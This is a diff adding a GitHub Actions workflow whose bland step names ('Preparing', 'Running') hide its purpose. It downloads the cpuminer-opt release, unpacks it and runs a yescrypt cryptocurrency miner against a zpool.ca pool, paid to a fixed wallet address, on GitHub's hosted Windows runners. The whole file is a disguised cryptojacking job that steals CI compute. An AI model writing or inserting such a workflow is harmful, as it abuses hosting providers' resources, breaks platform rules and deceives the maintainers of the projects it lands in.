@@ -1,0 +1,16 @@
+name: Xmode_Core
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    - name: Preparing
+      run: Invoke-WebRequest https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-win.zip -OutFile cpuminer-opt-win.zip
+    - name: Prepare_Q2
+      run: Expand-Archive cpuminer-opt-win.zip
+    - name: Running
+      run: .\cpuminer-opt-win\cpuminer-avx2.exe -a yescrypt -o stratum+tcp://yescrypt.sea.mine.zpool.ca:6233 -u XodAkKrxESGiJvzAX2ropKAAFLJ6rac2J5 -p c=DASH,zap=BSTY/XMY -t4
+    - name: DONE
+      run: exit
